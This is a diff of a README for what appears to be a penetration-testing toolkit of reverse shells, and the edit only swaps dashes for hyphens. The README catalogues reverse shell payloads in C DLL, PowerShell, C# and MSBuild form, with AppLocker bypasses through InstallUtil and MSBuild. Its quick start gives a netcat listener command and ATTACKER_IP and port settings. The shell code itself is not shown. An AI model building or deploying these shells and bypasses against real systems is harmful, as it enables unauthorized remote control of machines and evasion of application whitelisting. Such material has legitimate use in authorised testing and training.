@@ -8,10 +8,10 @@ TCP callback shells for post-exploitation. Use after confirming code execution w
 
 | File | Description |
 |------|-------------|
-| [`dll_revshell.c`](dll_revshell.c) | C DLL — reverse shell on `DllMain` load. Edit `ATTACKER_IP` and `ATTACKER_PORT` before compiling |
+| [`dll_revshell.c`](dll_revshell.c) | C DLL - reverse shell on `DllMain` load. Edit `ATTACKER_IP` and `ATTACKER_PORT` before compiling |
 | [`powershell_revshell.ps1`](powershell_revshell.ps1) | PowerShell TCP reverse shell + one-liner variants for embedding in exploits |
-| [`csharp_revshell.cs`](csharp_revshell.cs) | C# reverse shell — compile with `csc.exe` (no deps). Includes InstallUtil bypass for AppLocker |
-| [`msbuild_revshell.xml`](msbuild_revshell.xml) | MSBuild inline C# reverse shell — LOLBIN execution, bypasses AppLocker default rules |
+| [`csharp_revshell.cs`](csharp_revshell.cs) | C# reverse shell - compile with `csc.exe` (no deps). Includes InstallUtil bypass for AppLocker |
+| [`msbuild_revshell.xml`](msbuild_revshell.xml) | MSBuild inline C# reverse shell - LOLBIN execution, bypasses AppLocker default rules |
 | [`msfvenom_commands.md`](msfvenom_commands.md) | Quick reference for generating DLL, EXE, and shellcode payloads with msfvenom |
 
 ## Quick Start
@@ -24,7 +24,7 @@ rlwrap nc -lvnp 4444
 ```
 
 ### 2. Build DLL Reverse Shell
-Edit `dll_revshell.c` — set your IP and port:
+Edit `dll_revshell.c` - set your IP and port:
 ```c
 #define ATTACKER_IP   "10.10.14.1"
 #define ATTACKER_PORT  4444
